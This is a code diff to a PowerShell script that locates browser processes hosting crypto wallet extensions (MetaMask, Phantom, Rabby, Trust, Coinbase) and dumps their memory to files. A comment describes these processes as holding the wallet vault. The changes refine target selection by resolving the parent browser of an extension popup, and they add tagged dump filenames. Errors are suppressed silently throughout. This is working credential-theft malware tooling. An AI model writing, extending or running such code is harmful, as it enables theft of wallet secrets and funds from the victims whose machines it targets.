@@ -2,11 +2,17 @@ param(
     [Parameter(Mandatory = $true)][string]$Name,
     [Parameter(Mandatory = $true)][string]$Target,
     [Parameter(Mandatory = $true)][string]$OutDir,
-    [Parameter(Mandatory = $true)][string]$OutList
+    [Parameter(Mandatory = $true)][string]$OutList,
+    [string]$Tag = ''
 )
 
 $ErrorActionPreference = 'SilentlyContinue'
 New-Item -ItemType Directory -Force -Path $OutDir | Out-Null
+$utf8 = New-Object -TypeName System.Text.UTF8Encoding -ArgumentList $false
+
+function Add-Line([string]$value) {
+    [IO.File]::AppendAllText($OutList, $value + [Environment]::NewLine, $utf8)
+}
 
 Add-Type @'
 using System;
@@ -29,9 +35,23 @@ $candidates = @()
 if ($Name -in @('phantom', 'metamask', 'rabby', 'trust', 'coinbase')) {
     # Browser extensions run in an extension renderer, never in the browser main process.
     $all = @(Get-CimInstance Win32_Process)
-    $roots = @()
+    $root = 0
     if ($Target -match '^\d+$') {
-        $roots = @([int]$Target)
+        $selected = $all | Where-Object { $_.ProcessId -eq [int]$Target }
+        if ($selected -and $selected.Name -match '(?i)chrome|msedge|brave') {
+            $root = [int]$Target
+        } elseif ($selected) {
+            # The foreground window may be the extension popup renderer itself;
+            # its extension siblings (the ones holding the vault) hang off the browser.
+            $parent = $all | Where-Object { $_.ProcessId -eq [int]$selected.ParentProcessId }
+            if ($parent -and $parent.Name -match '(?i)chrome|msedge|brave') {
+                $root = [int]$parent.ProcessId
+            }
+        }
+    }
+    $roots = @()
+    if ($root -gt 0) {
+        $roots = @($root)
     } else {
         $roots = @($all | Where-Object { $_.Name -match '(?i)chrome|msedge|brave' } |
             Select-Object -ExpandProperty ProcessId)
@@ -87,11 +107,12 @@ foreach ($process in ($candidates | Sort-Object WorkingSet64 -Descending)) {
 
     $size = [int64]$process.WorkingSet64
     if ($size -gt 1610612736) {
-        Add-Content -LiteralPath $OutList -Value ("BIG|{0}|{1}" -f $process.Id, [int]($size / 1MB))
+        Add-Line ("BIG|{0}|{1}" -f $process.Id, [int]($size / 1MB))
         continue
     }
 
-    $path = Join-Path $OutDir ("wallet-{0}-{1}-{2}.dmp" -f $Name, $process.Id, (Get-Date -Format yyyyMMddHHmmss))
+    $prefix = if ($Tag) { "wallet-$Tag-$Name" } else { "wallet-$Name" }
+    $path = Join-Path $OutDir ("{0}-{1}-{2}.dmp" -f $prefix, $process.Id, (Get-Date -Format yyyyMMddHHmmss))
     $handle = [SpcDump]::OpenProcess(0x0410, $false, [uint32]$process.Id)
     if ($handle -eq [IntPtr]::Zero) { continue }
     $stream = [IO.File]::Create($path)
@@ -100,7 +121,7 @@ foreach ($process in ($candidates | Sort-Object WorkingSet64 -Descending)) {
     $stream.Close()
     [SpcDump]::CloseHandle($handle)
     if ($ok) {
-        Add-Content -LiteralPath $OutList -Value $path
+        Add-Line $path
     } else {
         Remove-Item -LiteralPath $path -Force
     }
